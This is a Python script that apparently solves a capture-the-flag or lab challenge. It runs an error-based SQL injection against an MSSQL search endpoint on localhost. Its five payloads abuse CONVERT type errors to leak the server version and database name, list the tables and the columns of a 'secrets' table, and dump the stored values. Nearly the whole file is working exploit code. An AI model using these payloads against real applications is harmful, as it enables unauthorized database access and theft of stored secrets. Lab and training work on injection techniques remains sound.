#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://localhost:5012/search"

def extract_error(payload):
    """Extract data from CONVERT error message"""
    r = requests.get(BASE_URL, params={"q": payload})
    match = re.search(r"converting the nvarchar value '([^']+)'", r.text)
    return match.group(1) if match else None

print("[*] Step 1: Detect MSSQL version")
payload1 = "a' AND 1=CONVERT(int,@@version)--"
version = extract_error(payload1)
print(f"[+] Version: {version}\n")

print("[*] Step 2: Get database name")
payload2 = "a' AND 1=CONVERT(int,DB_NAME())--"
db_name = extract_error(payload2)
print(f"[+] Database: {db_name}\n")

print("[*] Step 3: Enumerate tables")
payload3 = "a' AND 1=CONVERT(int,(SELECT (SELECT table_name+',' FROM information_schema.tables FOR XML PATH(''))))--"
tables = extract_error(payload3)
print(f"[+] Tables: {tables}\n")

print("[*] Step 4: Get columns from 'secrets' table")
payload4 = "a' AND 1=CONVERT(int,(SELECT (SELECT column_name+',' FROM information_schema.columns WHERE table_name='secrets' FOR XML PATH(''))))--"
columns = extract_error(payload4)
print(f"[+] Columns in 'secrets': {columns}\n")

print("[*] Step 5: Extract flag")
payload5 = "a' AND 1=CONVERT(int,(SELECT (SELECT value+',' FROM secrets FOR XML PATH(''))))--"
flag = extract_error(payload5)
print(f"[+] Flag: {flag.rstrip(',')}")

